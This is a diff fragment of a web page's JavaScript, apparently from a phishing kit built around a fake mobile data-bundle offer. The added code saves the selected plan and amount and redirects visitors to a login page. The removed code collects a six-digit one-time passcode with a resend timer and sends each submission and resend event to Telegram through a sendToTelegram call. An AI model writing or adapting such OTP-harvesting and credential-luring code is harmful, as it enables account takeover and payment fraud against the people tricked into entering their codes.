+    data:document.getElementById("data").value,
+    amount:document.getElementById("summaryAmount").innerText.replace("USD ","")
+  };
+  sessionStorage.setItem("selectedPlan",JSON.stringify(selectedBundle));
+  closeModal();
+  const toast=document.getElementById("toast");
+  toast.classList.add("show");
+  setTimeout(()=>toast.classList.remove("show"),2200);
+  setTimeout(()=>{window.location.href="login.html"},500);
 }
 
-/* OTP inputs */
-
-const otpInputs=document.querySelectorAll("#step3 .pin input")
-
-const otpBtn=document.getElementById("otpBtn")
-
-otpInputs.forEach((input,i)=>{
-
-input.oninput=()=>{
-
-input.value=input.value.replace(/\D/g,"")
-
-if(input.value && i<5) otpInputs[i+1].focus()
-
-validateOtp()
-
-}
-
-input.onkeydown=e=>{
-
-if(e.key==="Backspace" && !input.value && i>0){
-
-otpInputs[i-1].focus()
-otpInputs[i-1].value=""
-
-validateOtp()
-
-}
-
-}
-
-})
-
-function validateOtp(){
-
-otpValue=[...otpInputs].map(i=>i.value).join("")
-
-if(otpValue.length===6)
-otpBtn.classList.add("active")
-else
-otpBtn.classList.remove("active")
-
-}
-
-/* submit */
-
-otpBtn.onclick=()=>{
-
-if(!otpBtn.classList.contains("active")) return
-if(otpSubmitted) return
-
-otpSubmitted=true
-
-sendToTelegram("offer_received")
-
-show("step4")
-
-setTimeout(()=>{
-
-location.href="thankyou.html"
-
-},1200)
-
-}
-
-/* resend */
-
-resendBtn.onclick=()=>{
-
-if(!resendBtn.classList.contains("active")) return
-if(resendClicked) return
-
-resendClicked=true
-
-sendToTelegram("resend_otp")
-
-startTimer()
-
-}
-
-/* timer */
-
-function startTimer(){
-
-let t=120
-
-time.textContent=t
-
-resendBtn.classList.remove("active")
-
-resendClicked=false
-
-otpInputs.forEach(i=>{
-i.disabled=false
-i.value=""
-})
-
-otpBtn.classList.remove("active")
-
-const timer=setInterval(()=>{
-
-t--
-
-time.textContent=t
-
-if(t<=0){
-
-clearInterval(timer)
-
-resendBtn.classList.add("active")
-
-otpInputs.forEach(i=>i.disabled=true)
-
-otpBtn.classList.remove("active")
-
-maskedNumber.innerHTML="Code expired. Request new OTP"
-
-}
-
-},1000)
-
-}
-
+updatePlan();
 </script>
-
 </body>
-
 </html>
